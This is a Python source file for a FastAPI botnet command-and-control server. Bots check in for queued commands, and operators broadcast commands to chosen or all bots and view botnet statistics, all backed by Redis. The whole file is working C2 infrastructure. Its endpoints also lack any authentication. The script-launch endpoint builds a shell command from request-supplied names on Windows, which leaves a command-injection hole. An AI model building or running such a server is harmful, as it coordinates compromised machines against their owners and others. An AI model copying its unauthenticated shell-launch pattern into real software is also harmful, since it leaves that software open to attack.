```python
from fastapi import FastAPI, Query, HTTPException, BackgroundTasks
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn
import asyncio
import json
import logging
import subprocess
import sys
import os
from datetime import datetime, timedelta
from typing import List, Dict, Any, Optional
import redis.asyncio as redis
from contextlib import asynccontextmanager
from pydantic import BaseModel

# --- System Manager for Process Control ---
class SystemManager:
    def __init__(self):
        self.processes: Dict[str, subprocess.Popen] = {}
        self.base_dir = os.path.dirname(os.path.abspath(__file__))

    def start_component(self, name: str, script_name: str) -> bool:
        if name in self.processes and self.processes[name].poll() is None:
            return True # Already running

        script_path = os.path.join(self.base_dir, script_name)
        if not os.path.exists(script_path):
            return False

        try:
            if sys.platform == "win32":
                # Launch in new window for visibility
                cmd = f'start "{name}" {sys.executable} "{script_path}"'
                proc = subprocess.Popen(cmd, shell=True)
            else:
                proc = subprocess.Popen([sys.executable, script_path])
            
            self.processes[name] = proc
            return True
        except Exception as e:
            print(f"Error starting {name}: {e}")
            return False

    def stop_component(self, name: str) -> bool:
        if name not in self.processes:
            return False
        
        proc = self.processes[name]
        if proc.poll() is None:
            if sys.platform != "win32":
                proc.terminate()
            # On Windows with shell=True/start, we can't easily kill the child window from here
            # without more complex logic (taskkill). For now, we assume manual close or just remove from tracking.
            pass
        
        del self.processes[name]
        return True

    def get_status(self) -> Dict[str, str]:
        status = {}
        # Check tracked processes
        for name, proc in list(self.processes.items()):
            if proc.poll() is None:
                status[name] = "Running"
            else:
                status[name] = "Stopped"
                del self.processes[name] # Cleanup
        return status

system_manager = SystemManager()

# --- Pydantic Models ---
class ComponentRequest(BaseModel):
    name: str
    script: Optional[str] = None

# --- Logging Configuration ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# --- Configuration ---
C2_PORT = 5000
C2_HOST = "0.0.0.0"
REDIS_HOST = "localhost"
REDIS_PORT = 6379
REDIS_DB = 0
BOT_ACTIVE_THRESHOLD = 300  # 5 minutes
COMMAND_RETENTION_DAYS = 7

# --- Global State ---
redis_client: Optional[redis.Redis] = None
pubsub_manager = None


class RedisCommandQueue:
    """
    Manages command queue and bot status using Redis for high-speed, distributed access.
    """

    def __init__(self, redis_conn: redis.Redis):
        self.redis = redis_conn

    async def register_bot(self, bot_id: str, ip_address: str, user_agent: str = None) -> None:
        """
        Register or update a bot in Redis.
        """
        current_time = datetime.now().timestamp()
        bot_data = {
            "bot_id": bot_id,
            "ip_address": ip_address,
            "last_check_in": current_time,
            "user_agent": user_agent or "unknown",
            "created_at": current_time,
            "total_commands_executed": 0,
            "status": "active",
        }
        
        # Store bot data in Redis hash
        await self.redis.hset(f"bot:{bot_id}", mapping=bot_data)
        
        # Add bot to active bots set (sorted by check-in time)
        await self.redis.zadd("bots:active", {bot_id: current_time})
        
        logger.info(f"[+] Bot registered: {bot_id} from {ip_address}")

    async def get_bot_status(self, bot_id: str) -> Optional[Dict[str, Any]]:
        """
        Retrieve bot status from Redis.
        """
        bot_data = await self.redis.hgetall(f"bot:{bot_id}")
        
        if bot_data:
            return {
                "bot_id": bot_id,
                "ip_address": bot_data.get(b"ip_address", b"").decode(),
                "last_check_in": float(bot_data.get(b"last_check_in", 0)),
                "user_agent": bot_data.get(b"user_agent", b"").decode(),
                "status": bot_data.get(b"status", b"").decode(),
                "total_commands_executed": int(bot_data.get(b"total_commands_executed", 0)),
                "created_at": float(bot_data.get(b"created_at", 0)),
            }
        return None

    async def get_all_bots(self) -> List[Dict[str, Any]]:
        """
        Retrieve all bots from Redis.
        """
        bot_ids = await self.redis.zrange("bots:active", 0, -1)
        bots = []
        
        for bot_id in bot_ids:
            bot_status = await self.get_bot_status(bot_id.decode())
            if bot_status:
                bots.append(bot_status)
        
        return bots

    async def enqueue_command(self, command: Dict[str, Any], target_bots: Optional[List[str]] = None) -> str:
        """
        Add a command to the Redis queue.
        """
        command_id = f"cmd:{datetime.now().timestamp()}:{len(str(command))}"
        current_time = datetime.now().timestamp()
        
        command_data = {
            "id": command_id,
            "command": json.dumps(command),
            "target_bots": json.dumps(target_bots) if target_bots else "null",
            "created_at": current_time,
            "executed_count": 0,
            "status": "pending",
        }
        
        # Store command in Redis hash
        await self.redis.hset(f"command:{command_id}", mapping=command_data)
        
        # Add command to pending queue
        await self.redis.lpush("commands:pending", command_id)
        
        # Publish command to all bots or specific bots
        if target_bots:
            for bot_id in target_bots:
                await self.redis.publish(f"bot:{bot_id}:commands", command_id)
        else:
            await self.redis.publish("commands:broadcast", command_id)
        
        logger.info(f"[+] Command {command_id} enqueued and published")
        return command_id

    async def get_pending_commands(self, bot_id: str) -> List[Dict[str, Any]]:
        """
        Retrieve pending commands for a specific bot from Redis.
        """
        # Get all pending commands
        pending_commands = await self.redis.lrange("commands:pending", 0, -1)
        
        commands = []
        for cmd_id in pending_commands:
            cmd_id_str = cmd_id.decode() if isinstance(cmd_id, bytes) else cmd_id
            cmd_data = await self.redis.hgetall(f"command:{cmd_id_str}")
            
            if cmd_data:
                target_bots_str = cmd_data.get(b"target_bots", b"null").decode()
                target_bots = json.loads(target_bots_str) if target_bots_str != "null" else None
                
                # Check if command targets this bot or all bots
                if target_bots is None or bot_id in target_bots:
                    command = json.loads(cmd_data.get(b"command", b"{}").decode())
                    commands.append({
                        "id": cmd_id_str,
                        "command": command,
                    })
        
        return commands

    async def mark_command_executed(self, command_id: str, bot_id: str) -> None:
        """
        Mark a command as executed by a bot.
        """
        await self.redis.hincrby(f"command:{command_id}", "executed_count", 1)
        
        # Store execution record
        execution_record = {
            "bot_id": bot_id,
            "executed_at": datetime.now().timestamp(),
        }
        await self.redis.hset(f"command:{command_id}:executions", bot_id, json.dumps(execution_record))

    async def cleanup_old_data(self) -> None:
        """
        Clean up old commands and inactive bots from Redis.
        """
        current_time = datetime.now().timestamp()
        cutoff_time = current_time - (COMMAND_RETENTION_DAYS * 86400)
        
        # Remove inactive bots from active set
        inactive_bots = await self.redis.zrangebyscore("bots:active", 0, current_time - BOT_ACTIVE_THRESHOLD)
        for bot_id in inactive_bots:
            await self.redis.zrem("bots:active", bot_id)
        
        logger.info(f"[+] Cleaned up {len(inactive_bots)} inactive bots")


@asynccontextmanager
async def lifespan(app: FastAPI):
    """
    Manage application lifecycle.
    """
    global redis_client
    
    logger.info("[*] C2 Server starting up")
    
    # Initialize Redis connection
    try:
        redis_client = await redis.from_url(f"redis://{REDIS_HOST}:{REDIS_PORT}/{REDIS_DB}", decode_responses=False)
        await redis_client.ping()
        logger.info("[+] Redis connection established")
    except Exception as e:
        logger.error(f"[-] Failed to connect to Redis: {e}")
        raise
    
    yield
    
    # Shutdown
    logger.info("[*] C2 Server shutting down")
    if redis_client:
        await redis_client.close()


# --- FastAPI Application ---
app = FastAPI(title="Ultra-Advanced C2 Server", version="3.0", lifespan=lifespan)


@app.get("/c2/get_command")
async def get_command(
    bot_id: str = Query(..., description="Unique bot identifier"),
    ip: Optional[str] = Query(None, description="Bot's IP address"),
    user_agent: Optional[str] = Query(None, description="Bot's User-Agent"),
) -> JSONResponse:
    """
    Endpoint for bots to check in and receive commands.
    
    This endpoint:
    1. Registers/updates the bot in Redis
    2. Retrieves pending commands for the bot
    3. Returns commands in a structured format
    """
    try:
        if not redis_client:
            return JSONResponse(content={"error": "Redis not available"}, status_code=500)
        
        queue = RedisCommandQueue(redis_client)
        
        # Register bot
        await queue.register_bot(bot_id, ip or "unknown", user_agent)
        logger.info(f"[+] Bot check-in: {bot_id} from {ip}")

        # Retrieve pending commands
        commands = await queue.get_pending_commands(bot_id)

        # Build response
        response = {
            "bot_id": bot_id,
            "timestamp": datetime.now().isoformat(),
            "commands": [cmd["command"] for cmd in commands],
            "command_count": len(commands),
        }

        return JSONResponse(content=response, status_code=200)

    except Exception as e:
        logger.error(f"[-] Error in get_command: {e}")
        return JSONResponse(content={"error": str(e)}, status_code=500)


@app.get("/c2/status")
async def get_status() -> JSONResponse:
    """
    Endpoint for operators to view botnet status.
    """
    try:
        if not redis_client:
            return JSONResponse(content={"error": "Redis not available"}, status_code=500)
        
        queue = RedisCommandQueue(redis_client)
        all_bots = await queue.get_all_bots()
        current_time = datetime.now().timestamp()

        active_bots = [
            bot for bot in all_bots
            if (current_time - bot["last_check_in"]) < BOT_ACTIVE_THRESHOLD
        ]
        inactive_bots = [
            bot for bot in all_bots
            if (current_time - bot["last_check_in"]) >= BOT_ACTIVE_THRESHOLD
        ]

        status_report = {
            "timestamp": datetime.now().isoformat(),
            "total_bots_seen": len(all_bots),
            "active_bots": len(active_bots),
            "inactive_bots": len(inactive_bots),
            "active_bots_list": active_bots,
            "inactive_bots_list": inactive_bots,
        }

        logger.info(f"[+] Status report: {len(active_bots)} active, {len(inactive_bots)} inactive")
        return JSONResponse(content=status_report, status_code=200)

    except Exception as e:
        logger.error(f"[-] Error in get_status: {e}")
        return JSONResponse(content={"error": str(e)}, status_code=500)


@app.post("/c2/issue_command")
async def issue_command(
    command: Dict[str, Any],
    target_bots: Optional[List[str]] = None,
) -> JSONResponse:
    """
    Endpoint for operators to issue commands to bots.
    """
    try:
        if not redis_client:
            return JSONResponse(content={"error": "Redis not available"}, status_code=500)
        
        queue = RedisCommandQueue(redis_client)
        command_id = await queue.enqueue_command(command, target_bots)
        
        response = {
            "status": "success",
            "command_id": command_id,
            "target_bots": target_bots or "all",
            "timestamp": datetime.now().isoformat(),
        }

        logger.info(f"[+] Command {command_id} issued to {len(target_bots) if target_bots else 'all'} bot(s)")
        return JSONResponse(content=response, status_code=200)

    except Exception as e:
        logger.error(f"[-] Error in issue_command: {e}")
        return JSONResponse(content={"error": str(e)}, status_code=500)


@app.get("/c2/botnet_stats")
async def botnet_stats() -> JSONResponse:
    """
    Endpoint for detailed botnet statistics.
    """
    try:
        if not redis_client:
            return JSONResponse(content={"error": "Redis not available"}, status_code=500)
        
        queue = RedisCommandQueue(redis_client)
        all_bots = await queue.get_all_bots()
        current_time = datetime.now().timestamp()

        total_commands_executed = sum(int(bot.get("total_commands_executed", 0)) for bot in all_bots)
        avg_uptime = sum(
            (current_time - bot["created_at"]) for bot in all_bots
        ) / len(all_bots) if all_bots else 0

        stats = {
            "total_bots": len(all_bots),
            "total_commands_executed": total_commands_executed,
            "average_bot_uptime_seconds": avg_uptime,
            "timestamp": datetime.now().isoformat(),
        }

        return JSONResponse(content=stats, status_code=200)

    except Exception as e:
        logger.error(f"[-] Error in botnet_stats: {e}")
        return JSONResponse(content={"error": str(e)}, status_code=500)


@app.delete("/c2/cleanup")
async def cleanup() -> JSONResponse:
    """
    Endpoint to trigger Redis cleanup.
    """
    try:
        if not redis_client:
            return JSONResponse(content={"error": "Redis not available"}, status_code=500)
        
        queue = RedisCommandQueue(redis_client)
        await queue.cleanup_old_data()
        
        return JSONResponse(content={"status": "cleanup completed"}, status_code=200)
    except Exception as e:
        logger.error(f"[-] Error in cleanup: {e}")
        return JSONResponse(content={"error": str(e)}, status_code=500)


@app.get("/health")
async def health_check() -> JSONResponse:
    """
    Health check endpoint.
    """
    redis_status = "connected" if redis_client else "disconnected"
    return JSONResponse(
        content={"status": "healthy", "redis": redis_status},
        status_code=200
    )


def run_c2_server():
    """
    Start the FastAPI C2 server with Uvicorn.
    """
    logger.info(f"[*] C2 Server starting on {C2_HOST}:{C2_PORT}")
    logger.info(f"[*] Redis backend: {REDIS_HOST}:{REDIS_PORT}")
    uvicorn.run(
        app,
        host=C2_HOST,
        port=C2_PORT,
        log_level="info",
        access_log=True,
    )


# --- System Control Endpoints ---

@app.post("/api/system/start")
async def start_component(req: ComponentRequest):
    if not req.script:
        raise HTTPException(status_code=400, detail="Script name required")
    success = system_manager.start_component(req.name, req.script)
    if not success:
        raise HTTPException(status_code=500, detail="Failed to start component")
    return {"status": "started", "component": req.name}

@app.post("/api/system/stop")
async def stop_component(req: ComponentRequest):
    success = system_manager.stop_component(req.name)
    if not success:
        raise HTTPException(status_code=404, detail="Component not found or not running")
    return {"status": "stopped", "component": req.name}

@app.get("/api/system/status")
async def get_system_status():
    return system_manager.get_status()

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
```
